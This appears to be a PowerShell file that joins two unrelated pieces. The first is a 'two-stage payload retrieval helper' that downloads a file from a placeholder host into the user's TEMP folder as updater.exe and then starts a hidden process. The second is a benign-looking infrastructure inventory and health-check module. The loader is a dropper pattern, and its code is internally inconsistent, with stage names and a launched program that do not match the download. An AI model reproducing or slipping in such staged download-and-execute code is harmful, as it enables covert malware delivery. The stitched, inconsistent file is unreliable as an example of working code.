<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage2Url = "https://internal.corp/stage1.ps1",
    [string]$WorkingPath = "$env:TEMP\updater.exe",
    [int]$TransferTimeout = 217
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$ProgressPreference = "SilentlyContinue"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
#Requires -Version 5.1
<#
.SYNOPSIS
    Infra.Node module with the exported inventory, tagging and health commands.
.DESCRIPTION
    The module keeps a small in-memory cache and a default timeout so callers do
    not have to pass the same values on every call.
.EXAMPLE
    Import-Module .\Infra.Node.psd1 -Force
#>

$ErrorActionPreference = "Stop"

$WarningPreference = 'Continue'

$script:DefaultTimeout = 30
$script:ModuleVersion = '4.6.8'

function Get-InfraNode {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Dev'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-InfraNodeTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-InfraNodeHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}
function Resolve-InfraPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Infra-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-InfraModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Infra.Node'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-InfraNode', 'Set-InfraNodeTag', 'Test-InfraNodeHealth')
    }
}

Write-Verbose ('Loaded module {0} version {1}' -f 'Infra.Node', $script:ModuleVersion)

$script:ExportedFunctions = @('Get-InfraNode', 'Set-InfraNodeTag', 'Test-InfraNodeHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Infra.Node')

Export-ModuleMember -Function Get-InfraNode, Set-InfraNodeTag, Test-InfraNodeHealth, Get-InfraModuleInfo
